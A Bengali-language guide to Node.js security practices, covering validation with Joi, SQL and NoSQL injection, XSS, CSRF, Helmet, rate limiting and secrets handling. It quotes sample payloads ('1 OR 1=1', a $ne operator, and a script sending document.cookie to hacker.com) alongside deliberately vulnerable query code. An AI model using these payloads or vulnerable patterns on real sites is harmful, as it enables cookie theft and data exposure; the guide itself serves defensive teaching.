# Security Best Practices

একটি প্রোডাকশন-গ্রেড Node.js অ্যাপ্লিকেশনের জন্য সিকিউরিটি সবচেয়ে গুরুত্বপূর্ণ বিষয়। নিচে সিকিউরিটির বিভিন্ন দিক এবং বেস্ট প্র্যাকটিসগুলো বিস্তারিত আলোচনা করা হলো।

## ১. Input Validation & Sanitization

সার্ভারে আসা যেকোনো ডেটাই ক্ষতিকর হতে পারে। তাই কখনো ইউজারের ইনপুটকে বিশ্বাস করা যাবে না।

### কেন Validation জরুরি?
ভ্যালিডেশন নিশ্চিত করে যে ডেটা সঠিক ফরম্যাটে এসেছে। উদাহরণস্বরূপ, ইমেইল ফিল্ডে আসলেই ইমেইল এসেছে কিনা, বা পাসওয়ার্ড যথেষ্ট শক্তিশালী কিনা।

### Using Joi / Zod (Validation Libraries)
ম্যানুয়ালি `if-else` দিয়ে ভ্যালিডেশন করা কষ্টসাধ্য এবং ভুল হওয়ার সম্ভাবনা থাকে। `Joi` বা `Zod` লাইব্রেরি দিয়ে এটি সহজে করা যায়।

```javascript
const Joi = require('joi');

// স্কিমা ডিফাইন করা
const userSchema = Joi.object({
    username: Joi.string().alphanum().min(3).max(30).required(),
    email: Joi.string().email().required(), // অবশ্যই ভ্যালিড ইমেইল হতে হবে
    password: Joi.string().pattern(new RegExp('^[a-zA-Z0-9]{3,30}$')).required(),
    age: Joi.number().integer().min(18).max(100) // বয়স ১৮-১০০ এর মধ্যে হতে হবে
});

// ভ্যালিডেশন চেক করা
const { error, value } = userSchema.validate(req.body);
if (error) {
    // বিস্তারিত এরর মেসেজ পাঠানো
    return res.status(400).json({ error: error.details[0].message });
}
```

---

## ২. Injection Prevention

হ্যাকাররা ইনপুট ফিল্ডের মাধ্যমে ক্ষতিকর কোড বা কুয়েরি পাঠিয়ে ডাটাবেসের নিয়ন্ত্রণ নেওয়ার চেষ্টা করে। একে ইনজেকশন অ্যাটাক বলে।

### A. SQL Injection
যখন ইউজারের ইনপুট সরাসরি SQL কুয়েরির সাথে জোড়া লাগিয়ে (Concatenate) এক্সিকিউট করা হয়, তখন এটি ঘটে।

❌ **Dangerous (Vulnerable Code):**
```javascript
const userId = req.body.id; // ধরি ইউজার পাঠাল: "1 OR 1=1"
// কুয়েরি হয়ে যাবে: SELECT * FROM users WHERE id = 1 OR 1=1
// এটি সব ইউজারের ডেটা রিটার্ন করে দেবে!
db.query(`SELECT * FROM users WHERE id = ${userId}`); 
```

✅ **Safe (Parameterized Query / ORM):**
ORM (যেমন Sequelize) বা Parameterized Query ব্যবহার করলে ইনপুটকে ডাটা হিসেবে দেখা হয়, কোড হিসেবে নয়।
```javascript
// Sequelize অটোমেটিক্যালি ইনপুট স্যানিটাইজ করে
User.findOne({ where: { id: req.body.id } });
```

### B. NoSQL Injection (MongoDB)
MongoDB তেও ইনজেকশন হতে পারে। হ্যাকাররা ইনপুটে অবজেক্ট পাঠিয়ে লজিক বাইপাস করতে পারে।

❌ **Vulnerable:**
```javascript
// ইউজার যদি পাসওয়ার্ডে { $ne: null } পাঠায়, তবে এটি ‘যেকোনো পাসওয়ার্ড’ ম্যাচ করবে!
User.findOne({ username: req.body.username, password: req.body.password });
```

✅ **Prevention (Sanitization):**
ইনপুটে যাতে `$` অপারেটর না থাকতে পারে, সেজন্য `mongo-sanitize` ব্যবহার করুন।
```javascript
const sanitize = require('mongo-sanitize');

// ইনপুট থেকে $ চিহ্ন রিমুভ করে দেয়
const cleanUsername = sanitize(req.body.username);
const cleanPassword = sanitize(req.body.password);

User.findOne({ username: cleanUsername, password: cleanPassword });
```

---

## ৩. XSS (Cross-Site Scripting)

এটি এমন একটি অ্যাটাক যেখানে হ্যাকার ওয়েবসাইটের ইনপুটে (যেমন কমেন্ট বক্স) জাভাস্ক্রিপ্ট কোড লিখে দেয়। পরে অন্য ইউজাররা যখন ওই পেজ ভিজিট করে, তখন সেই স্ক্রিপ্ট তাদের ব্রাউজারে রান হয় এবং কুকি চুরি হতে পারে।

**উদাহরণ:**
কমেন্টে কেউ লিখল: `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`

✅ **Prevention:**
1.  **Escape Output:** ইউজারের ইনপুট ব্রাউজারে দেখানোর সময় HTML ট্যাগগুলোকে বিশেষ ক্যারেক্টারে কনভার্ট করা (যেমন `<` কে `&lt;` তে)। React/Vue এটি বাই ডিফল্ট করে।
2.  **Backend Sanitization:** `xss-clean` বা `dompurify` লাইব্রেরি ব্যবহার করে ইনপুট সেভ করার আগেই স্ক্রিপ্ট ট্যাগ মুছে ফেলা।

```javascript
const xss = require('xss-clean');
app.use(xss()); // সব ইনপুট থেকে ক্ষতিকর স্ক্রিপ্ট রিমুভ করে দেবে
```

---

## ৪. CSRF (Cross-Site Request Forgery)

এই অ্যাটাকে হ্যাকার আপনাকে কোনো লিংকে ক্লিক করিয়ে আপনার ব্রাউজারে সেভ থাকা ক্রেডেনশিয়াল ব্যবহার করে আপনার অজান্তেই কোনো অ্যাকশন (যেমন টাকা পাঠানো, পাসওয়ার্ড বদলানো) করিয়ে নেয়।

**Scenario:**
আপনি ব্যাংকের সাইটে লগইন করা আছেন। হ্যাকার আপনাকে একটি মেইলে লিংক পাঠাল। লিংকে ক্লিক করতেই ব্যাকগ্রাউন্ডে ব্যাংকের সাইটে টাকা ট্রান্সফারের রিকোয়েস্ট চলে গেল। ব্রাউজার অটোমেটিক্যালি আপনার কুকি পাঠিয়ে দেবে, তাই সার্ভার ভাববে আপনিই রিকোয়েস্ট করেছেন।

✅ **Prevention:**
- **CSRF Token:** প্রতিটি ফর্ম সাবমিটের সময় সার্ভার একটি গোপন টোকেন জেনারেট করে। রিকোয়েস্টের সাথে সেই টোকেন না থাকলে সার্ভার রিকোয়েস্ট রিজেক্ট করে দেবে।
- **SameSite Cookie:** কুকি সেট করার সময় `SameSite: 'Strict'` ব্যবহার করা।

---

## ৫. Secure Headers (Helmet.js)

HTTP হেডারের মাধ্যমে অনেক সিকিউরিটি পলিসি সেট করা যায়। `helmet` প্যাকেজটি স্বয়ংক্রিয়ভাবে ১০+ সিকিউরিটি হেডার সেট করে দেয়।

```javascript
const helmet = require('helmet');
app.use(helmet());
```

এটি যা যা করে:
- **X-Powered-By** হাইড করে (হ্যাকাররা জানবে না আপনি Express ব্যবহার করছেন)।
- **HSTS** এনফোর্স করে (ব্রাউজারকে বাধ্য করে HTTPS ব্যবহার করতে)।
- **X-XSS-Protection** এনাবল করে।
- **Clickjacking** রোধ করে।

---

## ৬. Rate Limiting (DDoS Protection)

একই IP থেকে খুব কম সময়ে অতিরিক্ত রিকোয়েস্ট আসলে সার্ভার ক্র্যাশ করতে পারে (DDoS Attack)। এটি রোধ করতে রেট লিমিটিং দরকার।

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // ১৫ মিনিট সময়
    max: 100, // সর্বোচ্চ ১০০ টি রিকোয়েস্ট
    message: 'Too many requests from this IP, please try again later.'
});

// সব রাউটে অ্যাপ্লাই করা
app.use(limiter);

// বা শুধু লগইন রাউটে অ্যাপ্লাই করা (ব্রুট ফোর্স অ্যাটাক ঠেকাতে)
app.use('/api/login', limiter);
```

---

## ৭. Environment Variables & Secrets Management

API Key, Database Password, Secret Key কখনো কোডবেসে (GitHub এ) আপলোড করবেন না।

✅ **Best Practice:**
- `.env` ফাইলে সব সিক্রেট রাখুন।
- `.gitignore` ফাইলে `.env` নাম যোগ করুন যাতে এটি গিটহাবে না যায়।
- সার্ভারে পরিবেশ অনুযায়ী (Dev/Prod) আলাদা `.env` ফাইল ব্যবহার করুন।

---

## ৮. Logging & Monitoring

সিকিউরিটি ব্রীচ হলে তা বোঝার জন্য লগিং খুব জরুরি।
- **Winston / Morgan:** রিকোয়েস্ট এবং এরর লগ করার জন্য।
- প্রোডাকশনে `console.log` এড়িয়ে চলা উচিত কারণ এটি পারফরম্যান্স কমিয়ে দেয় এবং সেনসিটিভ ডেটা লিক করতে পারে।
